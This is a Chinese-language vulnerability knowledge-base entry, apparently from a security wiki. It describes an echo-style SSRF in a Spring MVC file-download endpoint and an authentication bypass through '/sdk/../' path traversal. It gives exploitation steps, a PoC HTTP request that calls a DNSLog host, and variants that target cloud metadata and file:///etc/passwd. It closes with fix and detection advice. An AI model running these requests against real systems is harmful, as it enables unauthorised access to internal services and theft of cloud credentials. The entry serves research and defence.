---
id: web-generic-ssrf-spring-actiondownloadfile-httpengine-response-stream
title: Spring MVC actionDownloadFile 未校验 url 参数：HttpEngine.downloadFromUrl 回显式 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: spring-actiondownloadfile-unvalidated-url-ssrf
aliases:
- actionDownloadFile SSRF
- HttpEngine.downloadFromUrl
- downloadFormUrl SSRF
- url 参数 SSRF
- 回显 SSRF
- 文件下载接口 SSRF
tags:
- java
- spring-mvc
- ssrf
- url
- download
- response-stream
- dnslog
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V198
  verified_at: '2026-11-06T23:08:44+08:00'
  notes: '已对照原文及14张截图核对：actionDownloadFile 的 url 直入 CMSTools.downloadFromUrl→HttpEngine.downloadFromUrl(new URL().openConnection) 并把响应流写回、/sdk/../grid/actionDownloadFile.do 鉴权绕过、DNSLog 出站均与截图一致；file:/jar: 仅为标注的变体，未验证'
---

## 一句话结论

管理系统的 `/grid/actionDownloadFile.do` 直接把用户可控的 `url` 参数传给 `HttpEngine.downloadFromUrl()`，后者用 `new URL(remotePath).openConnection()` 发起请求并把响应流原样写回客户端；没有协议/域名/内网 IP 校验，攻击者可让服务器访问任意内网 HTTP 服务、云元数据或 DNSLog，并读取响应内容。

## 原理

- **入口**：`actionDownloadFile` 从请求取 `url`、`name`、`length`，不做任何校验，调用 `CMSTools.downloadFromUrl(url, name, length, request, response)`。
- **Sink**：`CMSTools.downloadFromUrl` 调用 `HttpEngine.downloadFromUrl(url)`；后者：
  ```java
  URL url = new URL(remotePath);
  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
  conn.setConnectTimeout(3000);
  conn.setRequestProperty("User-Agent", "Mozilla/4.0 ...");
  InputStream inputStream = conn.getInputStream();
  return inputStream;
  ```
- **回显**：调用方把 `InputStream` 包装成 `BufferedInputStream`，再写入 `response.getOutputStream()`，按 `length`/响应输出；因此这不是盲 SSRF，目标响应的正文会直接回到攻击者。
- **为什么成立**：`url` 没有经过 `URI` 解析后的 scheme/host 白名单，也没有拒绝 `127.0.0.1`、`10.0.0.0/8`、`169.254.169.254` 等内网地址；`HttpURLConnection` 默认跟随重定向（同协议），还可被用来探测端口/服务。
- **入口可达性**：文章通过 `AuthInterceptor` 的 `url.contains(白名单)` 判断，用 `/sdk/../grid/actionDownloadFile.do` 让原始 URL 含白名单片段 `/sdk/`、容器归一化后路由到 `/grid/actionDownloadFile.do`，未登录即可访问。若目标已修复该鉴权问题，则需要低权限会话。

## 触发条件

- 目标存在 `actionDownloadFile`（或同类文件下载/代理接口），`url` 参数可控。
- 接口可达：无需认证，或可通过鉴权白名单 `contains` + `/../` 路径穿越绕过。
- 应用服务器能访问目标地址（内网 HTTP 服务、云元数据、DNSLog 等）。
- 目标未对 `url` 做 scheme/host/IP 白名单，也未禁用重定向。

## 利用步骤

1. 确认接口：`GET /grid/actionDownloadFile.do?url=http://<dnslog>/&name=x&length=1`，观察 DNSLog 是否收到请求。
2. 若无鉴权或鉴权可绕过，使用 `/sdk/../grid/actionDownloadFile.do?...` 形式访问。
3. 读取内网服务：把 `url` 换成 `http://127.0.0.1:8080/`、`http://10.x.x.x:port/`、`http://169.254.169.254/latest/meta-data/` 等，观察响应正文/长度/耗时。
4. 对返回内容中的接口继续请求；可结合 `file:`/`jar:` 等协议（若 `new URL` 支持且未被限制）读取本地文件。
5. 若响应被 `length` 截断，调整 `length` 或使用分块读取；若只回显部分内容，用 Range/重复请求拼接。

## PoC

```http
GET /sdk/../grid/actionDownloadFile.do?url=http://xxx.dnslog.cn&name=12121&length=2121212 HTTP/1.1
Host: target
Connection: keep-alive
```

原文用该请求验证了出站（DNSLog 收到解析）；把 `url` 换成内网地址即可读取响应。PoC 未在本机复跑。

## 变体与关联

- 变体：`url` 指向 `file:///etc/passwd`、`jar:file:///...`、`http://169.254.169.254/...`；是否可用取决于 `new URL` 的协议支持与 JDK 版本。
- 变体：其他下载/预览/代理接口复用 `HttpEngine.downloadFromUrl`，可按同一模式审计。
- 关联：OA `GetRawFile` 弱黑名单 SSRF 见 [[web-generic-ssrf-oa-getrawfile-weak-blacklist]]；AI 推理 `model` 参数 SSRF 见 [[web-generic-ssrf-ai-inference-model-param-url-ssrf]]。
- 关联：鉴权白名单 `contains` + `../` 绕过见 [[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]、[[web-generic-auth-interceptor-login-prefix-dotdot-bypass]]。
- 边界：目标对 `url` 做 host/IP 白名单、禁用重定向、限制出站，或接口需要有效高权限会话时，利用面缩小。

## 检测与防御

- **修复**：对 `url` 做 `URI` 解析，只允许 `https`/`http` 与业务白名单域名；解析后拒绝私有/保留 IP、回环、链路本地与云元数据地址；禁用或限制重定向。
- **网络**：应用服务器出站走代理/白名单，默认拒绝内网与元数据；对下载接口单独限制目标范围。
- **检测**：请求 `url` 含内网 IP、`169.254.169.254`、`file:`、`jar:`、非常见端口；响应体包含内网服务 banner/元数据；应用进程发起异常 DNS/HTTP 连接；同一接口高频探测不同 host:port。
- **加固**：下载接口加认证与权限校验；不要仅靠 `url.contains` 白名单做鉴权；对返回内容做类型/大小限制，避免被当作任意代理。
